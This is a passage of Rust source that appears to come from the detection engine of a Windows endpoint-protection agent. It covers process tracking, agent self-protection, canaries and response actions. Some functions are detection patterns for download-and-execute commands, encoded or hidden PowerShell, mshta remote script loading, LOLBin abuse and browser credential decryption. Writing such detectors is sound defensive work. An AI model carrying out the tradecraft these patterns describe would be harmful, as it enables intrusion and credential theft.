/// task / service / WMI name; NEW-4), so engine de-dup state and server
/// incident grouping never merge unrelated objects. `emit` accepts it only
/// on `remediation_only` hits, so it can never be killed, suspended or
/// quarantined (the action filter also refuses pid 0).
pub(crate) fn unknown_subject(ts: TimestampMs, object: &str) -> ProcessInfo {
    let id = crate::canary::fnv64(&object.trim().to_ascii_lowercase());
    let mut p = placeholder(
        &ProcessGuid(format!("{UNKNOWN_WRITER_PREFIX}{id:016x}")),
        0,
        ts,
    );
    p.cmdline = "(unknown writer: the change could not be attributed to a process)".into();
    p
}

pub(crate) fn is_unknown_subject(p: &ProcessInfo) -> bool {
    p.pid == 0 && p.guid.0.starts_with(UNKNOWN_WRITER_PREFIX) && p.image.is_empty()
}

/// Stable identity of the object an attributed-kind event changed (registry
/// key + value, task path, service name, WMI binding), for
/// [`unknown_subject`].
pub(crate) fn changed_object(e: &Event) -> String {
    match &e.data {
        EventData::RegistrySet {
            key, value_name, ..
        } => format!("reg:{key}\\{value_name}"),
        EventData::TaskRegistered(t) => format!("task:{}", t.name),
        EventData::ServiceInstalled(s) => format!("svc:{}", s.name),
        EventData::WmiSubscription(w) => {
            format!("wmi:{}|{}|{}", w.namespace, w.filter, w.consumer)
        }
        _ => format!("event:{}:{}", e.kind().as_str(), e.guid.0),
    }
}

impl Hit {
    fn new(rule: &str, guid: &ProcessGuid, severity: Severity, summary: String) -> Hit {
        Hit {
            rule: rule.to_string(),
            guid: guid.clone(),
            severity,
            summary,
            actions: vec![],
            suspend: false,
            kill_at_expiry: false,
            strong: STRONG_RULES.contains(&rule),
            escalation_ip: None,
            extra_evidence: vec![],
            tamper: false,
            process: None,
            mode_override: None,
            name: None,
            author: None,
            attack: None,
            dedup_key: None,
            remediation_only: false,
        }
    }
}

fn kill(p: &ProcessInfo, tree: bool) -> ResponseAction {
    ResponseAction::KillProcess {
        pid: p.pid,
        guid: Some(p.guid.clone()),
        tree,
    }
}

fn quarantine(p: &ProcessInfo) -> ResponseAction {
    ResponseAction::QuarantineFile {
        path: p.image.clone(),
        sha256: p.sha256.clone(),
    }
}

fn placeholder(guid: &ProcessGuid, pid: u32, ts: TimestampMs) -> ProcessInfo {
    ProcessInfo {
        guid: guid.clone(),
        pid,
        ppid: 0,
        parent_guid: None,
        image: String::new(),
        cmdline: String::new(),
        user: None,
        integrity: None,
        start_ts: ts,
        exit_ts: None,
        signer: None,
        signed: SignatureState::Unknown,
        sha256: None,
        motw_zone: None,
        file_size: None,
        path_class: PathClass::Other,
    }
}

/// Volume-aware path class: only the system drive can be System / Windows /
/// Program Files; unmapped `\Device\…` paths never are (see
/// [`PathClass::of_with_system_drive`]).
fn path_class_of(image: &str, system_drive: char) -> PathClass {
    PathClass::of_with_system_drive(image, system_drive)
}

/// Kestrel's service (internal and display name) and the tray's Run value
/// (`kestrel-win` consts / `installer/Kestrel.wxs`).
const OWN_SERVICE_NAME: &str = "KestrelAgent";
const OWN_SERVICE_DISPLAY_NAME: &str = "Kestrel EDR Agent";
const OWN_TRAY_RUN_VALUE: &str = "KestrelTray";

/// `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (any hive spelling,
/// WOW6432Node view included), exactly that key.
fn is_hklm_run_key(key: &str) -> bool {
    let k = key.trim().trim_start_matches('\\').to_ascii_lowercase();
    let Some(rest) = k
        .strip_prefix(r"hklm\")
        .or_else(|| k.strip_prefix(r"hkey_local_machine\"))
        .or_else(|| k.strip_prefix(r"registry\machine\"))
    else {
        return false;
    };
    let rest = rest.trim_end_matches('\\');
    rest == r"software\microsoft\windows\currentversion\run"
        || rest == r"software\wow6432node\microsoft\windows\currentversion\run"
}

/// Comparison key for the agent image: normalised, lower-case, **with** the
/// drive letter (V-H1). A configured path without a drive letter is anchored
/// on the system drive. Empty when unknown.
fn agent_image_key(configured: &str, system_drive: char) -> String {
    let t = configured.trim();
    if t.is_empty() {
        return String::new();
    }
    let n = normalize_path(t);
    if has_drive_letter(&n) {
        n
    } else if n.starts_with('\\') && !n.starts_with(r"\\") {
        format!("{system_drive}:{n}")
    } else {
        String::new()
    }
}

/// Locations an engine-proposed quarantine never touches, whatever the rule
/// (V-H4 defence in depth; the agent's quarantine policy re-checks): task
/// definitions and machine key stores.
fn never_quarantine(path: &str) -> bool {
    let n = normalize_path(path);
    let rest = strip_drive(&n);
    [
        r"\windows\system32\tasks\",
        r"\windows\syswow64\tasks\",
        r"\windows\tasks\",
        r"\programdata\microsoft\crypto\",
    ]
    .iter()
    .any(|p| rest.starts_with(p))
        || rest.split('\\').any(|c| c == "..")
}

fn has_drive_letter(n: &str) -> bool {
    let b = n.as_bytes();
    b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && b[2] == b'\\'
}

/// Signature that grants no trust: unsigned, invalid (incl. revoked) or not
/// known yet.
fn untrusted_sig(s: SignatureState) -> bool {
    s != SignatureState::Valid
}

fn describe(p: &ProcessInfo) -> String {
    if p.image.is_empty() {
        format!("process {}", p.pid)
    } else {
        describe_proc(p)
    }
}

fn short_name(p: &ProcessInfo) -> String {
    if p.image.is_empty() {
        format!("process {}", p.pid)
    } else {
        crate::paths::file_name(&p.image).to_string()
    }
}

fn stores_phrase(touched: &[(&'static str, &'static str)]) -> String {
    let mut groups: Vec<(&str, Vec<String>)> = Vec::new();
    for (app, noun) in touched {
        match groups.iter_mut().find(|g| g.0 == *app) {
            Some(g) => g.1.push((*noun).to_string()),
            None => groups.push((app, vec![(*noun).to_string()])),
        }
    }
    let mut parts: Vec<String> = groups
        .iter()
        .take(4)
        .map(|(app, nouns)| format!("{app} {}", join_and(nouns)))
        .collect();
    if groups.len() > 4 {
        parts.push(format!("{} other stores", groups.len() - 4));
    }
    parts.join(", plus ")
}

/// "0.7 s" below ten seconds, "14 s" above.
fn fmt_secs(ms: i64) -> String {
    let ms = ms.max(0);
    if ms < 10_000 {
        format!("{:.1} s", ms as f64 / 1000.0)
    } else {
        format!("{} s", ms / 1000)
    }
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(n).collect::<String>())
    }
}

fn dpapi_browser(desc: &str) -> Option<&'static str> {
    let d = desc.to_ascii_lowercase();
    [
        ("chrome", "Chrome"),
        ("edge", "Edge"),
        ("opera", "Opera"),
        ("brave", "Brave"),
        ("chromium", "Chromium"),
        ("vivaldi", "Vivaldi"),
        ("yandex", "Yandex"),
        ("browser", "browser"),
    ]
    .iter()
    .find(|(k, _)| d.contains(k))
    .map(|(_, n)| *n)
}

fn access_rights(mask: u32) -> String {
    let mut r = Vec::new();
    if mask & 0x10 != 0 {
        r.push("read");
    }
    if mask & 0x20 != 0 {
        r.push("write");
    }
    if mask & 0x2 != 0 {
        r.push("create-thread");
    }
    format!("{} access (0x{mask:x})", r.join("/"))
}

/// Why a command line looks like a paste-and-run payload.
fn clickfix_reason(cmd_lower: &str, child: &str) -> Option<&'static str> {
    let lure = cmd_lower.contains('#') && LURE_WORDS.iter().any(|w| cmd_lower.contains(w));
    if lure {
        return Some("a fake-CAPTCHA lure comment");
    }
    let hidden = has_hidden_window(cmd_lower);
    let encoded = has_encoded_command(cmd_lower) || cmd_lower.contains("frombase64string");
    let cradle = CRADLE_WORDS.iter().any(|w| cmd_lower.contains(w))
        || CRADLE_TOKENS.iter().any(|w| contains_word(cmd_lower, w));
    let url = cmd_lower.contains("http://")
        || cmd_lower.contains("https://")
        || cmd_lower.contains("@ssl\\");
    if CLICKFIX_SHELLS.contains(&child) {
        if encoded {
            return Some("an encoded command");
        }
        if hidden && (cradle || url) {
            return Some("a hidden download-and-execute command");
        }
        if cradle && url {
            return Some("a download-and-execute command");
        }
        if hidden && child != "cmd.exe" {
            return Some("a hidden window");
        }
        return None;
    }
    if child == "mshta.exe"
        && (url || cmd_lower.contains("javascript:") || cmd_lower.contains("vbscript:"))
    {
        return Some("mshta loading remote script");
    }
    if url || hidden || encoded {
        return Some("a remote payload");
    }
    None
}

/// Lower-case data of a RunMRU / TypedPaths value: which LOLBin it invokes, if suspicious.
fn runmru_lolbin(data_lower: &str) -> Option<&'static str> {
    let d = data_lower.trim_end_matches("\\1").trim();
    // The invoked program is the earliest LOLBin named in the entry.
    let bin = RUNMRU_LOLBINS
        .iter()
        .filter_map(|b| word_pos(d, b).map(|p| (p, *b)))
        .min_by_key(|(p, _)| *p)
        .map(|(_, b)| b);
    let cradle = CRADLE_WORDS.iter().any(|w| d.contains(w))
        || ["iex", "irm", "iwr"].iter().any(|w| contains_word(d, w));
    let url = d.contains("http://") || d.contains("https://") || d.contains("@ssl\\");
    let hidden = has_hidden_window(d);
    let encoded = has_encoded_command(d);
    let lure = d.contains('#') && LURE_WORDS.iter().any(|w| d.contains(w));
    match bin {
        Some(b @ ("conhost" | "forfiles" | "finger")) if has_arguments(d) => Some(b),
        Some(b) if cradle || url || hidden || encoded || lure => Some(b),
        None if cradle => Some("powershell"),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Engine
// ---------------------------------------------------------------------------

pub(crate) struct EngineState {
    host: HostContext,
    system_drive: char,
    /// Normalised full path of the agent image, *with* its drive letter
    /// (V-H1: a copy on another volume / mounted ISO is not the agent).
    agent_image: String,
    /// The agent process itself (image at `agent_image`).
    agent_guids: HashSet<ProcessGuid>,
    /// Direct children the agent recorded spawning (`ProcessStart.agent_spawned`)
    /// and `conhost.exe` attached to them. Never their other descendants.
    /// Non-tamper rules skip them; TP-* rules still apply.
    agent_children: HashSet<ProcessGuid>,
    /// Cached guid of the genuine lsass.exe (V-L1 / V-L14).
    lsass_guid: Option<ProcessGuid>,
    server_ips: HashSet<String>,
    policy: Policy,
    exclusions: Vec<Excl>,
    iocs: Iocs,
    exfil_hosts: Vec<String>,
    table: ProcessTable,
    states: HashMap<ProcessGuid, ProcState>,
    suspends: Vec<SuspendWindow>,
    sigma: Vec<SigmaRule>,
    sigma_kinds: u32,
    browser_stops: VecDeque<(TimestampMs, u32)>,
    last_browser_start: TimestampMs,
    kill_intents: VecDeque<(TimestampMs, ProcessGuid)>,
    /// Browser processes that were the target of an injection / memory-write /
    /// thread-context / debugger signal (ST-07's inputs) in their lifetime:
    /// never treated as a genuine importer by ST-16. Bounded.
    tampered: HashSet<ProcessGuid>,
    /// Size of `tampered` at which exited entries are pruned (L1).
    taint_prune_at: usize,
    debug_ports: HashMap<u16, TimestampMs>,
    clickfix: Vec<ClickfixPending>,
    canaries: Mutex<CanaryState>,
    out: Vec<Output>,
    last_evict: TimestampMs,
    /// NEW-1: last time a `RemoveAutorun` (by fingerprint) was ordered, and a
    /// re-issue held back by the rate limit (sent from `tick` when due).
    autorun_reissue: HashMap<String, (TimestampMs, Option<ResponseAction>)>,
    /// RW / CD / PS rule families (see `families`).
    families: Vec<Box<dyn Family>>,
    /// Protection turned off locally (tray switch): every hit is forced to
    /// Audit and no response action leaves the engine except resuming a
    /// suspended process.
    paused: Option<kestrel_common::PauseMode>,
    /// Triage 2026-10-22 item 1: ST-12 first-seen memory per binary
    /// (sha256, else path + size), bounded ([`MAX_ST12_SEEN`]).
    st12_seen: HashMap<String, SeenBinary>,
    /// Triage 2026-10-22 item 12: Low / Info Audit alerts already emitted per
    /// (rule, image, evidence object) in the last 24 h: (last alert, repeats
    /// folded since). Bounded ([`MAX_LOW_SEEN`]).
    low_seen: HashMap<u64, (TimestampMs, u32)>,
    /// Fix round 2026-10-25: credential reads per untrusted process tree
    /// (see [`TreeCred`]), bounded ([`MAX_TREE`]), [`TREE_TTL_MS`].
    tree: HashMap<ProcessGuid, TreeCred>,
    /// BITS upload jobs: (time, creating process).
    bits_jobs: VecDeque<(TimestampMs, ProcessGuid)>,
    /// FP-18: last start of a genuine browser installer / updater.
    last_browser_update: TimestampMs,
}

/// ST-12 first-seen entry (triage 2026-10-22 item 1).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SeenBinary {
    /// Time of the last ST-12 alert for this binary.
    last_alert: TimestampMs,
    /// Riskiest path class it alerted from (1 profile / AppData, 2 Temp /
    /// Downloads / removable or network media).
    rank: u8,
    /// Executions folded into that alert since.
    repeats: u32,
    /// FP-14: Protect-mode suspend windows of this binary that ended in a
    /// resume (not persisted across restarts).
    resumed: u32,
}

/// ST-12 alerts once per binary per device per this interval.
const ST12_FIRST_SEEN_MS: i64 = 7 * 24 * 3600 * 1000;
const MAX_ST12_SEEN: usize = 8192;
/// Low / Info Audit aggregation interval and bound.
const LOW_AGG_MS: i64 = 24 * 3600 * 1000;
const MAX_LOW_SEEN: usize = 8192;

/// ST-12 identity of an image: its sha256 when known, else path + size.
fn st12_key(p: &ProcessInfo) -> String {
    match p.sha256.as_deref().map(str::trim).filter(|h| !h.is_empty()) {
        Some(h) => format!("sha256:{}", h.to_ascii_lowercase()),
        None => format!(
            "path:{}|{}",
            normalize_path(&p.image),
            p.file_size
                .map(|s| s.to_string())
                .unwrap_or_else(|| "?".into())
        ),
    }
}

/// Riskiness of an ST-12 path class: Temp / Downloads / external media
/// rank above other user-writable folders (AppData, profile).
fn st12_rank(c: PathClass) -> u8 {
    match c {
        PathClass::Temp | PathClass::Downloads | PathClass::External => 2,
        _ => 1,
    }
}

/// The object a Low / Info alert is about, for aggregation (item 12).
fn evidence_object(e: &Event) -> String {
    match &e.data {
        // The started file itself (ST-12 first-seen decides per binary and
        // path class; this only folds exact repeats).
        EventData::ProcessStart(ps) => format!(
            "start:{}|{}|{:016x}",
            normalize_path(&ps.image),
            ps.file_size.map(|s| s.to_string()).unwrap_or_default(),
            crate::canary::fnv64(&ps.cmdline)
        ),
        EventData::ProcessStop { .. } => "stop".into(),
        EventData::FileAccess { path, .. } => normalize_path(path),
        EventData::NetConnect {
            dst_ip, dst_host, ..
        } => dst_host
            .as_deref()
            .map(|h| h.trim_end_matches('.').to_ascii_lowercase())
            .unwrap_or_else(|| dst_ip.clone()),
        EventData::DnsQuery { qname, .. } => qname.trim_end_matches('.').to_ascii_lowercase(),
        EventData::DpapiUnprotect { description } => format!("dpapi:{description}"),
        EventData::ProcessAccess(t)
        | EventData::RemoteThread(t)
        | EventData::ThreadContext(t)
        | EventData::DebugAttach(t) => normalize_path(&t.target_image),
        EventData::ImageLoad { path, .. } => normalize_path(path),
        EventData::FileActivity(fa) => format!(
            "files:{}",
            fa.note_name
                .as_deref()
                .unwrap_or(fa.top_new_ext.as_deref().unwrap_or(""))
        ),
        EventData::ScriptBlock { content, .. } => {
            format!("script:{:016x}", crate::canary::fnv64(content))
        }
        EventData::Tamper { kind, .. } => format!("tamper:{kind:?}"),
        // Review M6: the object plus what was written into it (value data,
        // task action, service binary, WMI consumer).
        EventData::RegistrySet { .. }
        | EventData::TaskRegistered(_)
        | EventData::ServiceInstalled(_)
        | EventData::WmiSubscription(_) => format!(
            "{}|{:016x}",
            changed_object(e).to_ascii_lowercase(),
            crate::canary::fnv64(&format!("{:?}", e.data))
        ),
    }
}

fn kind_bit(k: EventKind) -> u32 {
    1u32 << (k as u32)
}

impl EngineState {
    pub fn new(host: HostContext, policy: Policy, bundle: RuleBundle) -> Result<Self, DetectError> {
        let sigma = sigma::compile_bundle(&bundle.rules)?;
        let server_ips = host
            .server_ips
            .iter()
            .filter_map(|s| parse_ip(s))
            .map(|i| i.to_string())
            .collect();
        let system_drive = host
            .system_drive
            .filter(|c| c.is_ascii_alphabetic())
            .map(|c| c.to_ascii_lowercase())
            .unwrap_or('c');
        let agent_image = agent_image_key(&host.agent_image, system_drive);
        let mut s = EngineState {
            host,
            system_drive,
            agent_image,
            agent_guids: HashSet::new(),
            agent_children: HashSet::new(),
            lsass_guid: None,
            server_ips,
            policy: Policy::default(),
            exclusions: vec![],
            iocs: Iocs::default(),
            exfil_hosts: vec![],
            table: ProcessTable::default(),
            states: HashMap::new(),
            suspends: vec![],
            sigma: vec![],
            sigma_kinds: 0,
            browser_stops: VecDeque::new(),
            last_browser_start: i64::MIN,
            kill_intents: VecDeque::new(),
            tampered: HashSet::new(),
            taint_prune_at: MAX_TAINTED,
            debug_ports: HashMap::new(),
            clickfix: vec![],
            canaries: Mutex::new(CanaryState::default()),
            out: vec![],
            last_evict: 0,
            autorun_reissue: HashMap::new(),
            families: crate::families::all(),
            paused: None,
            st12_seen: HashMap::new(),
            low_seen: HashMap::new(),
            tree: HashMap::new(),
            bits_jobs: VecDeque::new(),
            last_browser_update: i64::MIN,
        };
        s.set_sigma(sigma);
        s.update_policy(policy);
        Ok(s)
    }

    fn set_sigma(&mut self, rules: Vec<SigmaRule>) {
        self.sigma_kinds = rules
            .iter()
            .fold(0, |acc, r| acc | kind_bit(r.route.kind()));
        self.sigma = rules;
    }

    pub fn update_policy(&mut self, p: Policy) {
        let drive = self.system_drive;
        self.exclusions = p.exclusions.iter().map(|x| Excl::new(x, drive)).collect();
        self.iocs = Iocs::build(&p.iocs);
        self.exfil_hosts = p
            .exfil_domains
            .iter()
            .map(|d| entry_host(d))
            .filter(|h| !h.is_empty())
            .collect();
        if !p.canaries {
            if let Ok(mut c) = self.canaries.lock() {
                *c = CanaryState::default();
            }
        }
        self.policy = p;
    }

    /// Turn the local pause on (`Some`) or off (`None`). Entering a pause
    /// releases every open suspend window (`ResumeProcess`), drops held-back
    /// autorun removals and pending ClickFix kills, so nothing queued before
    /// the switch acts while protection is off.
    pub fn set_paused(&mut self, mode: Option<kestrel_common::PauseMode>) -> Vec<Output> {
        self.paused = mode;
        if mode.is_some() {
            for w in std::mem::take(&mut self.suspends) {
                self.out.push(Output::Action(ResponseAction::ResumeProcess {
                    pid: w.pid,
                    guid: Some(w.guid),
                }));
            }
            for (_, pending) in self.autorun_reissue.values_mut() {
                *pending = None;
            }
            for c in self.clickfix.iter_mut() {
                c.protect = false;
            }
        }
        let outs = std::mem::take(&mut self.out);
        self.gate(outs)
    }

    pub fn paused(&self) -> Option<kestrel_common::PauseMode> {
        self.paused
    }

    /// While paused only `ResumeProcess` may leave the engine (undoing a
    /// suspend is never containment) and alerts carry no actions.
    pub fn gate(&self, outs: Vec<Output>) -> Vec<Output> {
        if self.paused.is_none() {
            return outs;
        }
        outs.into_iter()
            .filter_map(|o| match o {
                Output::Action(a @ ResponseAction::ResumeProcess { .. }) => Some(Output::Action(a)),
                Output::Action(_) => None,
                Output::Alert(mut d) => {
                    d.actions.clear();
                    if d.alert.mode == RuleMode::Protect {
                        d.alert.mode = RuleMode::Audit;
                    }
                    d.alert.protection_off = self.paused;
                    Some(Output::Alert(d))
                }
            })
            .collect()
    }

    pub fn update_rules(&mut self, b: RuleBundle) -> Result<(), DetectError> {
        let rules = sigma::compile_bundle(&b.rules)?;
        self.set_sigma(rules);
        Ok(())
    }

    pub fn table(&self) -> &ProcessTable {
        &self.table
    }

    pub fn seed_process(&mut self, mut info: ProcessInfo) {
        if !info.image.is_empty() {
            // Recompute: the platform's classification may predate volume awareness.
            info.path_class = path_class_of(&info.image, self.system_drive);
        }
        // A snapshot cannot prove the agent spawned it: never agent_spawned.
        self.note_agent(&info, false);
        let ts = info.start_ts;
        self.table.insert(info.clone());
        self.note_lsass(&info);
        // Known-bad processes already running at agent start: report on the next call.
        let ev = Event {
            ts,
            pid: info.pid,
            guid: info.guid.clone(),
            data: EventData::ProcessStart(ProcessStart {
                ppid: info.ppid,
                parent_guid: info.parent_guid.clone(),
                image: info.image.clone(),
                cmdline: info.cmdline.clone(),
                user: info.user.clone(),
                integrity: info.integrity,
                session_id: 0,
                signer: info.signer.clone(),
                signed: info.signed,
                sha256: info.sha256.clone(),
                motw_zone: info.motw_zone,
                file_size: info.file_size,
                agent_spawned: false,
            }),
        };
        self.check_process_iocs(&ev, &info);
    }

    /// See [`crate::Engine::enrich_process`].
    pub fn enrich_process(
        &mut self,
        guid: &ProcessGuid,
        facts: crate::ProcessFacts,
        now: TimestampMs,
    ) -> Vec<Output> {
        let Some(cur) = self.table.get(guid).cloned() else {
            return vec![];
        };
        let mut info = cur.clone();
        let mut hash_changed = false;
        let mut sig_changed = false;
        if info.sha256.is_none() {
            if let Some(h) = facts.sha256.filter(|h| !h.trim().is_empty()) {
                info.sha256 = Some(h);
                hash_changed = true;
            }
        }
        let upgrade =
            info.signed == SignatureState::Unknown && facts.signed != SignatureState::Unknown;
        // A revoked certificate demotes a previously valid signature.
        let revoked =
            info.signed == SignatureState::Valid && facts.signed == SignatureState::Invalid;
        if upgrade || revoked {
            info.signed = facts.signed;
            if facts.signer.is_some() {
                info.signer = facts.signer;
            }
            sig_changed = true;
        }
        if !hash_changed && !sig_changed {
            return vec![];
        }
        if let Some(p) = self.table.get_mut(guid) {
            p.sha256 = info.sha256.clone();
            p.signed = info.signed;
            p.signer = info.signer.clone();
        }
        if self.is_agent_owned(guid) {
            return vec![];
        }
        let ev = Event {
            ts: now.max(info.start_ts),
            pid: info.pid,
            guid: info.guid.clone(),
            data: EventData::ProcessStart(ProcessStart {
                ppid: info.ppid,
                parent_guid: info.parent_guid.clone(),
                image: info.image.clone(),
                cmdline: info.cmdline.clone(),
                user: info.user.clone(),
                integrity: info.integrity,
                session_id: 0,
                signer: info.signer.clone(),
                signed: info.signed,
                sha256: info.sha256.clone(),
                motw_zone: info.motw_zone,
                file_size: info.file_size,
                agent_spawned: false,
            }),
        };
        // Hash / certificate IOCs (dedup per indicator keeps this idempotent).
        self.check_process_iocs(&ev, &info);
        if sig_changed {
            let parent = self.table.parent_of(&info).cloned();
            self.check_st12(&ev, &info, parent.as_ref());
            self.check_st08b(&ev, &info);
            // Re-judge open suspend windows of this process.
            let kill = untrusted_sig(info.signed) && info.path_class.is_user_writable();
            for w in self.suspends.iter_mut().filter(|w| &w.guid == guid) {
                w.kill_at_expiry = w.kill_capable && kill;
            }
        }
        if hash_changed {
            for w in self.suspends.iter_mut().filter(|w| &w.guid == guid) {
                w.sha256 = info.sha256.clone();
            }
            // Review M1: the hash arrived late (large images are hashed
            // after start), so ST-12's first-seen identity changes from
            // path + size to the hash: judge again by hash.
            if !sig_changed {
                let parent = self.table.parent_of(&info).cloned();
                self.check_st12(&ev, &info, parent.as_ref());
            }
        }
        std::mem::take(&mut self.out)
    }

    pub fn canaries(&self, profile: &str) -> Vec<CanarySpec> {
        if !self.policy.canaries {
            return vec![];
        }
        let specs = canary::canary_specs(&self.host.hostname, profile);
        if let Ok(mut c) = self.canaries.lock() {
            for p in canary::immediate_arm_prefixes(&specs) {
                if !c.armed.contains(&p) {
                    c.armed.push(p);
                }
            }
            for s in specs.iter().filter(|s| is_conditional_canary(&s.path)) {
                let d = driveless(&s.path);
                if !c.conditional.contains(&d) && !c.armed.contains(&d) {
                    c.conditional.push(d);
                }
            }
        }
        specs
    }

    pub fn arm_canary(&mut self, path: &str) {
        let d = driveless(path);
        if let Ok(mut c) = self.canaries.lock() {
            c.conditional.retain(|x| x != &d);
            if !c.armed.contains(&d) {
                c.armed.push(d);
            }
        }
    }

    pub fn disarm_canary(&mut self, path: &str) {
        let d = driveless(path);
        if let Ok(mut c) = self.canaries.lock() {
            c.armed.retain(|x| x != &d);
        }
    }

    pub fn armed_canaries(&self) -> Vec<String> {
        self.canaries
            .lock()
            .map(|c| c.armed.clone())
            .unwrap_or_default()
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    /// Is `image` the agent's own image? Full path *including* the drive
    /// letter (V-H1): `D:\Program Files\Kestrel\kestrel-agent.exe` on a
    /// mounted ISO or a `\Device\…` path without a drive is not the agent.
    fn is_agent_image(&self, image: &str) -> bool {
        !self.agent_image.is_empty()
            && !image.is_empty()
            && normalize_path(image) == self.agent_image
    }

    /// Kestrel's own install artefacts, recognised by **exact** name and
    /// **exact** binary (never a name prefix, never the name alone):
    /// * a `service_installed` named `KestrelAgent` / `Kestrel EDR Agent`
    ///   whose ImagePath is the running agent's image (quotes stripped,
    ///   normalised, case-insensitive, drive included) with the `service`
    ///   argument (or none);
    /// * the HKLM `…\CurrentVersion\Run` value `KestrelTray` whose command
    ///   is `kestrel-tray.exe` next to the agent image, with `--background`
    ///   (or nothing).
    ///
    /// Kestrel's name on another binary, or the agent binary under another
    /// service / value name, is judged like anything else.
    pub(crate) fn is_own_install_artifact(&self, e: &Event) -> bool {
        if self.agent_image.is_empty() {
            return false;
        }
        let image_args = |cmd: &str| -> (String, String) {
            let t = cmd.trim();
            let t = t
                .strip_prefix(r"\??\")
                .or_else(|| t.strip_prefix(r"\\?\"))
                .unwrap_or(t);
            let (img, rest, _) = crate::families::autorun::split_image(t);
            (normalize_path(&img), rest.trim().to_ascii_lowercase())
        };
        match &e.data {
            EventData::ServiceInstalled(s) => {
                let n = s.name.trim();
                if !(n.eq_ignore_ascii_case(OWN_SERVICE_NAME)
                    || n.eq_ignore_ascii_case(OWN_SERVICE_DISPLAY_NAME))
                {
                    return false;
                }
                let (img, args) = image_args(&s.image_path);
                img == self.agent_image && (args.is_empty() || args == "service")
            }
            EventData::RegistrySet {
                key,
                value_name,
                data: Some(data),
                op: RegistryOp::Set,
                ..
            } => {
                if !value_name.trim().eq_ignore_ascii_case(OWN_TRAY_RUN_VALUE)
                    || !is_hklm_run_key(key)
                {
                    return false;
                }
                let Some((dir, _)) = self.agent_image.rsplit_once('\\') else {
                    return false;
                };
                let tray = format!(r"{dir}\kestrel-tray.exe");
                let (img, args) = image_args(data);
                img == tray && (args.is_empty() || args == "--background")
            }
            _ => false,
        }
    }

    /// Is `p` the running agent? The agent image (full path with drive) and,
    /// when the host context knows it, the agent's own pid (V-H1: a user can
    /// start `kestrel-agent.exe` themselves — suspended, then injected — and
    /// that process must be judged like any other). The image check alone
    /// is only used when the pid is unknown (tests, simulation).
    fn is_agent_identity(&self, p: &ProcessInfo) -> bool {
        self.is_agent_image(&p.image) && (self.host.agent_pid == 0 || p.pid == self.host.agent_pid)
    }

    /// Conservative variant for "never act on our own binary": the exact
    /// agent path, or a drive-less / device path whose rest matches it.
    fn may_be_agent_image(&self, path: &str) -> bool {
        if self.agent_image.is_empty() || path.is_empty() {
            return false;
        }
        let n = normalize_path(path);
        n == self.agent_image || (!has_drive_letter(&n) && n == strip_drive(&self.agent_image))
    }

    /// Record agent identity for a new process (V-H1). Parentage alone never
    /// makes a process the agent's: a parent PID can be spoofed
    /// (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) and the agent image is
    /// executable by users. Only
    /// * the agent image itself,
    /// * a direct child the agent recorded spawning (`agent_spawned`, set by
    ///   the sensor from the agent's own pid + creation-time record), and
    /// * `conhost.exe` (System32) attached to one of those children
    ///
    /// count; the trust is never inherited further down the tree. With a
    /// known agent pid, "the agent image itself" means that pid only.
    fn note_agent(&mut self, info: &ProcessInfo, agent_spawned: bool) {
        if self.is_agent_identity(info) {
            self.agent_guids.insert(info.guid.clone());
            return;
        }
        if agent_spawned {
            self.agent_children.insert(info.guid.clone());
            return;
        }
        if file_name_lower(&info.image) == "conhost.exe"
            && path_class_of(&info.image, self.system_drive) == PathClass::System
        {
            let parent = info
                .parent_guid
                .clone()
                .or_else(|| self.table.parent_of(info).map(|p| p.guid.clone()));
            if parent
                .is_some_and(|g| self.agent_guids.contains(&g) || self.agent_children.contains(&g))
            {
                self.agent_children.insert(info.guid.clone());
            }
        }
    }

    /// The agent process itself (exempt from every rule, never killed).
    fn is_agent_guid(&self, g: &ProcessGuid) -> bool {
        self.agent_guids.contains(g)
    }

    /// The agent or one of its recorded direct children: skipped by every
    /// rule except TP-* (tamper).
    fn is_agent_owned(&self, g: &ProcessGuid) -> bool {
        self.agent_guids.contains(g) || self.agent_children.contains(g)
    }

    // ---- read-only accessors for rule families (`families::Ctx`) ----

    pub(crate) fn rule_mode(&self, rule: &str) -> RuleMode {
        self.mode(rule)
    }

    pub(crate) fn is_protected(&self, p: &ProcessInfo) -> bool {
        self.protected(p)
    }

    /// The agent or a recorded agent child (families never take these as
    /// subjects; families have no TP rules).
    pub(crate) fn is_agent_process(&self, p: &ProcessInfo) -> bool {
        self.is_agent_owned(&p.guid) || self.is_agent_identity(p)
    }

    /// Cached genuine lsass.exe (V-L1 / V-L14), see [`Self::note_lsass`].
    pub(crate) fn lsass_guid(&self) -> Option<&ProcessGuid> {
        self.lsass_guid.as_ref()
    }

    /// Remember lsass.exe when it is the System32 image started by
    /// wininit.exe (System32). Any other `lsass.exe` (a user launching a copy
    /// of System32\lsass.exe, which then exits) never re-points it.
    /// Call after `info` is in the table. Snapshot seeding may deliver
    /// lsass before wininit, so a System32 wininit also adopts an lsass child
    /// that is already known (a one-off scan: wininit starts once per boot).
    fn note_lsass(&mut self, info: &ProcessInfo) {
        let sys = |s: &Self, p: &ProcessInfo, name: &str| {
            file_name_lower(&p.image) == name
                && path_class_of(&p.image, s.system_drive) == PathClass::System
        };
        if sys(self, info, "lsass.exe") {
            if self
                .table
                .parent_of(info)
                .is_some_and(|p| sys(self, p, "wininit.exe"))
            {
                self.lsass_guid = Some(info.guid.clone());
            }
        } else if sys(self, info, "wininit.exe") {
            let found = self
                .table
                .iter()
                .filter(|p| p.exit_ts.is_none() && sys(self, p, "lsass.exe"))
                .filter(|p| {
                    self.table
                        .parent_of(p)
                        .is_some_and(|pp| pp.guid == info.guid)
                })
                .max_by_key(|p| p.start_ts)
                .map(|p| p.guid.clone());
            if found.is_some() {
                self.lsass_guid = found;
            }
        }
    }

    pub(crate) fn is_tampered(&self, g: &ProcessGuid) -> bool {
        self.tampered.contains(g)
    }

    pub(crate) fn system_drive(&self) -> char {
        self.system_drive
    }

    // ---- rule families ----

    /// Run `f` on every family with a read-only context, then emit the hits.
    /// Alerts emitted meanwhile (by ST/TP rules or the hits) are offered to
    /// every family's `on_alert` once; hits from `on_alert` do not cascade.
    fn run_families(
        &mut self,
        ev: &Event,
        now: TimestampMs,
